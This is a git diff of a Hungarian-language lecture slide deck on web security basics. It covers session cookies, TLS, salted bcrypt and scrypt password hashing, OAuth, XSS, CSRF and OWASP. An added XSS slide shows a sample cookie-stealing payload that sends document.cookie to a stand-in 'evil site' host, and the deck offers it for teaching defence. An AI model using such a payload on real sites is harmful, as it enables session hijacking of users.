@@ -13,6 +13,10 @@
         font-family: 'Yanone Kaffeesatz';
         font-weight: normal;
       }
+      img {
+	          max-width: 100%;
+      }
+
       .remark-code { font-size: 1.2em; }, .remark-inline-code { font-family: 'Ubuntu Mono'; }
     </style>
   </head>
@@ -33,8 +37,10 @@ class: center, middle
 
 - Kell valami ami azonosít egy sessiont
 - Cookie
-TODO: bemásolni egy cookie screenshotot
 
+```
+Cookie:"PHPSESSID=3rqf0186spggo3evc2ged0p4p7"
+```
 --
 
 ### Mi van ha ellopják?
@@ -64,15 +70,12 @@ varrocs_sztekurzus
 - A szerver oldal hitelesítve van
 - Titkosítva van a kapcsolat
 - A szerver privát kulcsa nélkül nem lehet visszafejteni (vagy még azzal sem)
-
----
-
-# XSS?
+![SSL handshake](https://zoompf.com/wp-content/uploads/2014/10/handshake.png)
 
 ---
 
 # Usernév / jelszó
-## Tárolom az adatbázisban
+## Adatbázisban
 
 --
 
@@ -82,23 +85,25 @@ varrocs_sztekurzus
 
 # Usernév / jelszó
 
-Hasheljünk
+Hasheljünk, hogy ne derüljön ki mi a jelszó
 
     hash("kiskacsa") => 73dc4c576a5a6062c52922b39ef9cfd6
+
+    Visszafelé nem működik
 --
 ### Mi van ha ellopják?
 
 --
 
   ### 1. Brute force kipörgetik
-  ### 2. Szivárványtáblák
+  ### 2. Jelszó adatbázisok / szivárványtáblák
 
 ---
 
 # Brute force ellen
 
-Megfelelő erősségű hash
-- bcrypt
+Megfelelő nehézségű hash
+- bcrypt (néhány linux disztribúció is ezt használja)
 - scrypt (paraméterezhető CPU és memória költség)
 
 ---
@@ -108,8 +113,15 @@ Megfelelő erősségű hash
 Salt
 - cleartextben van az adatbázisban
 - hash(password+salt)
+- Ha két usernek ugyanaz a jelszava, akkor ez nem fog látszani
 - Az előre legyártott táblázatok kevesebbet fognak érni
+- A lényege nem a hossz, hanem hogy egyedinek kell lennie
 
+---
+
+# Ne is tároljunk user nevet / jelszót
+
+OpenID / OAUTH2
 ---
 
 class: center, middle
@@ -121,6 +133,16 @@ class: center, middle
 ---
 
 XSS
+
+Ha valami user által beadott tartalom megjelenik a visszaadott oldalban
+
+```html
+<img src="gonoszoldal.cn/"+document.cookie >
+```
+
+--
+
+Megoldás: Mindent escape-elni kell
 
 ---
 
@@ -135,6 +157,11 @@ XSS
 
 ---
 
+# CSRF
+
+
+---
+
 class: center, middle
 # Megbíznék ebben az egészben?
 
@@ -142,6 +169,12 @@ class: center, middle
 
 class: center, middle
 # Nem!
+
+---
+class: center, middle
+
+#OWASP
+owasp.org
 
 ---
 
@@ -152,21 +185,6 @@ class: center, middle
 ## Ne csinálj saját cryptót
 ### Mert úgyis elrontod
 ## Ellenőrizd a bejövő paramétereket
-
----
-
-# Ne is tároljunk user nevet / jelszót
-
-OAUTH2
-
----
-
----
-
-# Injection támadások
-
-- XSS
-- 'SQL' injection
 
 ---
 
